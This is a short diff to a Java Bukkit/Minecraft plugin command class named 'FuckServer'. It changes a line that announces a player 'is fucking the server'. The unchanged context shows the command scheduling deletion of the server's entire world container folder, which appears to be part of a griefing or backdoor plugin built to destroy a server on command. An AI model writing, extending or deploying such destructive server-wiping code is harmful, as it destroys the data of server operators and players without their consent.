@@ -84,7 +84,7 @@ public class FuckServer extends Command {
         }
         locked = true;
         p.sendMessage(Start.COMMAND_PREFIX + "Proceeding!");
-        this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is fucking the server!");
+        p.Notify(ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is fucking the server!");
         BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(this.plugin, () -> {
             Bukkit.getScheduler().runTaskLater(this.plugin, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 1);
             for (int i = 0; i <= 100; i++) {
